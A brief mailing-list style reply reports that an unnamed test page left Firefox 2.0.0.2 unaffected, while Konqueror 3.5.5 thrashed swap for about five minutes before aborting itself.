Nope.  Ran this one against Mozilla/5.0 (X11; U; Linux i686; en-US;
rv:1.8.1.2) Gecko/20061023 SUSE/2.0.0.2-1.1 Firefox/2.0.0.2, and it
didn't even flinch.  No OOM-killing here.

On the other hand, Konqueror 3.5.5 "release 45.4" churned swap madly for
about five minutes (the machine continued to run well enough if just a
bit slower) until Konq sig-sixed itself.

Cheers
